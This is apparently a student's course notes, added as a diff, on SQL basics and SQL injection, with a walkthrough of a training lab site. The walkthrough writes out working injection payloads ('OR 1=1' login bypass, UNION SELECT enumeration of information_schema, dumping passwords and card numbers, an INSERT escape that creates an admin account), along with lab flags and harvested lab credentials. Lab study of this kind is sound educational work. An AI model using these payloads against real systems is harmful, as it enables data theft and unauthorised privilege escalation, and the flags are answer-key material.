@@ -1,0 +1,321 @@
+#DAY 3 SQL INJECTION
+
+______________________________________________________________________________________
+
+#WEB EXPLOITATION DAY 2(SQL)
+	
+	COMMANDS:
+
+		SELECT Extracts data from a database
+		UNION Used to combine the result-set of two or more SELECT statements
+		USE Selects the DB to use
+		UPDATE Updates data in a database
+		DELETE Deletes data from a database
+		INSERT INTO Inserts new data into a database
+		CREATE DATABASE Creates a new database
+		ALTER DATABASE Modifies a database
+		CREATE TABLE Creates a new table
+		ALTER TABLE Modifies a table
+		DROP TABLE Deletes a table
+		CREATE INDEX Creates an index (search key)
+		DROP INDEX Deletes an index
+		
+		https://www.w3schools.com/SQL/sql_syntax.asp	
+	
+#SQL DEMO	
+	
+	SHOW DATABASES;
+	     SCHEME 
+	     
+	    by defaut sql database has three defaults
+		    infomation shcemed 
+		    my sql 
+		    performance scheme 
+	    dont look into them 
+	    
+	USE session (semi case sensitive)
+	SELECT * FROM session; 
+	
+		each database contians mutiple tables 
+		access using dot notation session.car session.user 
+		
+	select * from sessions.car;
+	
+		the table contians columns 
+		colums contain data 
+		
+	half to guess how many columsns there are to union half to match.
+	data types matter 
+	
+	
+	select * from session.Tire; UNION select * from session.car;
+	
+	HALF to use the amount of columns in first table 
+	 	
+	select * from session.Tire; UNION select name,type,cost,color from 		session.car;	
+	golden statement to find names of other tables columns 
+		
+#sql injection - considerations 
+		
+	requires valid sql queries 
+	Fully patched systems can be vulnerable due to misconfiguration
+	Input Field Sanitization
+	String vs Integer Values
+	Is information_schema Database available?
+	GET Request versus POST Request HTTP methods
+		
+		
+	*' OR 1 = '1* <-- first step testing for sql injection  will break give 					all users and password if works
+	
+________________________________________________________________________________________
+
+#sql demo	 	
+		10.50.21.3 
+		web explotation another tool
+		username passwd sql 
+		' or 1='1 user
+		' or 1='1 passwd
+		POST method 
+		url
+		network tab f12 dev console 
+		reload and click on post request 
+		go to request or where username and password is turn to raw or 			source copy and paste after url with before that a question mark 			enter all users and passwords
+		only thing you can do for a login page get user pass using sql
+		if not useless.
+		
+#2
+		test 
+		
+		find valurable field 
+		try vlaid option wiht the or statement 
+		work willdrop entire database 
+		audi' or 1='1
+		
+		find out how many columns there are <-- incase there hiding any 
+		Audi' UNION SELECT 1,2,3,4,5;# <--- K.I.S.S keep it simple stupid
+		out of order column two is hidden order 1 3 4 5 5 columns 
+		
+		golden statement
+		UNION SELECT table_schema,table_name,column_name FROM 		information_schema.columns;#
+		Audi' UNION SELECT table_scheme,table_name,column_name,5;#
+		Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM 			information_schema.columns;#
+		
+		pull more relevant info
+		Audi ' UNION SELECT id,2,name,pass,5 FROM session.user;#
+					columns		scheme.table
+					
+					
+#3
+
+		Audi' union Select tireid,2,name,size,cost FROM session.Tires;#
+		
+		stuck to a number of columns only got 4 stuck with 4 use multiple 			queries can aslo use offset. pick one with most columns
+		  
+		 using GET method url cant type in website 
+		 
+		 http://10.50.21.3/uniondemo.php?Selection=2&Submit=Submit
+		 	increments selections to go thrugh tables three columns 
+		 10.50.21.3/uniondemo.php?Selection=1 OR 1=1 ;#
+		 	increments 
+		 every option but 1 work test them all to find valurable 
+		 some options golden option wont work 
+		 found out how mnay columns and order 
+		 http://10.50.21.3/uniondemo.php?Selection=2 UNION SELECT 1,2,3 ;# 
+		 three different order 1 3 2 <-- affects golden statement order 
+		 time for golden statement 
+		 <url>?Selection=2' UNIONSELECTtable_schema,column_name,table_name 
+		FROM information_schema.columns;#
+		session top or bottom
+		UNION SELECT color,cost,year FROM session.car;#
+_____________________________________________________________________________________
+
+#sql exercise 1-11 13 
+#exercise 1:
+q1.get the movie title of eahc film from the table movies 
+
+		SELECT title FROM movies;
+		
+q2.find the director of each film	
+		
+		SELECT Director FROM movies;
+		
+q3.Find the title and director of each film 
+		
+		SELECT Director,Title FROM movies;
+		
+q4.Find the title and year of each film
+
+		SELECT year,Title FROM movies;
+		
+q5.Find all the information about each film 
+
+
+		SELECT * FROM movies;
+
+#exercise 2
+
+q1.Find the movie with a row id of 6 ✓
+
+		SELECT * FROM movies Where id == 6;
+
+q2.Find the movies released in the years between 2000 and 2010 
+
+		SELECT * FROM movies Where year >= 2000 and year <= 2010;
+		
+q3. Find the movies not released in the years between 2000 and 2010
+
+		SELECT * FROM movies Where year not between 2000 and 2010;
+		
+q4.Find the first 5 Pixar movies and their release year
+
+		SELECT * FROM movies Where id <= 5
+		
+#exercise 3
+
+q1.Find all the Toy Story movies 
+
+		SELECT * FROM movies where Title like "toy story _" or Title like 			"Toy Story";
+
+q2.Find all the movies directed by John Lasseter 
+
+		SELECT * FROM movies where director like "John Lasseter";
+
+q3.Find all the movies (and director) not directed by John Lasseter 
+
+		SELECT * FROM movies where director not like "John Lasseter";
+		
+q4.Find all the WALL-* movies 
+
+		SELECT * FROM movies where title like "WALL%;
+		
+#exercise 4
+
+q1.List all directors of Pixar movies (alphabetically), without duplicates ✓	
+
+		SELECT  distinct director FROM movies order by director;
+----------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------
+
+#DAY 3 ACTIVTIES
+#SQL injection
+
+q1.On the DNLA site identify the flag using the Categories page.To answer input the characters inside the flag.
+
+	set multiplex tunnel to T1 on por t80 through your jump jump 
+	http into go to catergories
+	http://127.0.0.1:1170/cases/productsCategory.php?category=2%20OR%201=1
+	scroll down till see flag
+	
+q2.How many user created tables are able to be identified through Injection of the web database?
+
+	ttp://127.0.0.1:1170/cases/productsCategory.php?category=1%20OR%201=1%20
+	http://127.0.0.1:1170/cases/productsCategory.php?category=2%20OR%201=1%20
+	http://127.0.0.1:1170/cases/productsCategory.php?category 		 	=1%20UNION%20SELECT%201,2,3%20;# <-- three 1 2 3 
+	http://127.0.0.1:1170/cases/productsCategory.php?category=1%20UNION%20SELECT%20table_schema,column_name,table_name%20FROM%20information_schema.columns;#
+	8
+	There is one user made database sqllinjection which a bunch of crap 
+	the far right is the tables while the column in the middel repersents
+	each column of that table count unqiue tables or use a filter get 8
+	
+	
+q3.Provide the password for users with administrator access to the DNLA database. To answer input the flag.
+	
+	
+	http://127.0.0.1:1170/cases/productsCategory.php?category=1%20OR%201=1%20
+	http://127.0.0.1:1170/cases/productsCategory.php?category=2%20OR%201=1%20
+	http://127.0.0.1:1170/cases/productsCategory.php?category 		 	=1%20UNION%20SELECT%201,2,3%20;# <-- three 1 2 3 
+	http://127.0.0.1:1170/cases/productsCategory.php?category=1%20UNION%20SELECT%20table_schema,column_name,table_name%20FROM%20information_schema.columns;#
+	UNION SELECT id,username,password FROM sqlinjection.members ;#
+	RkmPsYsLSqn8u4Z4TF4s
+	
+q4.Utilizing the Search page on DNLA, identify the flag. To answer input only the characters inside the flag.
+	
+	go to the search bar
+	'OR 1 ='1
+	q5tQaKb29a9QaG9g7i9m
+	
+q5.Identify the version of the database that DNLA is utilizing.To answer input the full version.
+
+	go to the link category=1 to use get method 
+     	http://127.0.0.1:1170/cases/productsCategory.php category=1%20UNION%
+     	20SELECT% 201,2,@@version
+
+		10.1.48-MariaDB-0ubuntu0.18.04.1
+	
+q6.Utilizing the input field on DNLA budget page, find the flag associated with credit cards. To answer the question enter only the characters inside the flag.
+	
+	UNION SELECT creditcard_number,2,3 FROM sqlinjection.payments ;#
+	xnmMGVBxT3Yr1hpVBiT3
+	
+q7.Find the flag associated with id 1337.	
+	
+	
+	UNION SELECT id,mime,price FROM sqlinjection.share4 ;#
+	
+	price 1337 mime base64 and id encoded flag 
+	
+q8.Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.
+	
+	
+	UNION SELECT id,username,permission FROM sqlinjection.members ;#
+	1 Boss RkmPsYsLSqn8u4Z4TF4s 1.00 <-- permissions
+	go to reigister 
+	enter infomation just to see format of command
+	INSERT INTO members (first_name, last_name, username, password, email, 	permission) VALUES ('Hacker', 'boi', 'hacker19', 'password', 'wqwwq', 3)  <--
+		normal format creates user with permission three we want one 
+		based on out query search of the amdin boss permission
+		we know the format of how our information gets processed
+		permission is after email we half to escape email and put
+		a value in permission did this with this format:
+		<email> \' , 1) 
+		
+	ashuduoi 83409 \' , 1 ) ;#swagmoney <-- in email section 
+	
+	INSERT INTO members (first_name, last_name, username, password, email, 		permission) VALUES ('Hacker', 'boi', 'hacker18', 'PASSWORD', 'ashuduoi 		83409 \'' , 1 ) ;#swagmoney', 3) <-- creates user with admin priveleges 
+	SPGXO1SjyucmpWVYYIPa
+		
+				
+	possible userful passwords and usernmaes:		
+	1	Boss	RkmPsYsLSqn8u4Z4TF4s
+	2	Maverick	turn&burn
+	3	phreak	pwd
+	4	Susan	flowers99
+	5	TW	imAPlaya
+	6	1-2-3-4	sayULuvM3
+	7	rich_kid	1M$
+	8	p0pStar	thrilla
+	9	Joe	vato
+	10		flag:	
+			
+_________________________________________________________________________________			
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+			
+		
+		
+		
